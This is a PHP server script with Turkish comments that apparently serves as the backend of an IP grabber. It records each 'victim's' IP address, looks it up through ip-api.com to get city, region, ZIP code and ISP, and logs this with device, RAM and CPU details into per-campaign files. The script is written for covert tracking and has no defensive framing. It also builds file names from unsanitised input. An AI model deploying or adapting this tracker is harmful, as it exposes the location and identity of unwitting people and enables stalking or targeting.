<?php
header('Content-Type: application/json');
date_default_timezone_set('Europe/Istanbul');

$data = json_decode(file_get_contents('php://input'), true);

if ($data) {
    $uid = $data['uid'] ?? 'yvx01';
    $logFile = 'log_' . $uid . '.json';
    
    // Kurbanın IP adresini al
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }

    // Sunucu tarafında IP sorgulama (Tarayıcı engeline takılmaz)
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}?fields=status,country,regionName,city,zip,isp"));
    
    $isp = "Bilinmiyor";
    $zip = "-";
    $location = "Bilinmiyor / Bilinmiyor / Bilinmiyor";

    if ($details && $details->status === 'success') {
        $isp = $details->isp;
        $zip = $details->zip;
        $location = "{$details->city} / {$details->regionName} / {$details->country}";
    }

    if(!file_exists($logFile)) file_put_contents($logFile, json_encode([]));
    $currentLogs = json_decode(file_get_contents($logFile), true);

    $newEntry = [
        "ip" => $ip,
        "zip" => $zip,
        "isp" => $isp,
        "location" => $location,
        "device" => $data['device'] ?? $_SERVER['HTTP_USER_AGENT'],
        "gpu" => "-",
        "ram" => $data['ram'] ?? "-",
        "cpu" => $data['cpu'] ?? "-",
        "time" => date('d.m.Y H:i:s')
    ];

    array_push($currentLogs, $newEntry);
    file_put_contents($logFile, json_encode($currentLogs));
    echo json_encode(["status" => "ok"]);
}
?>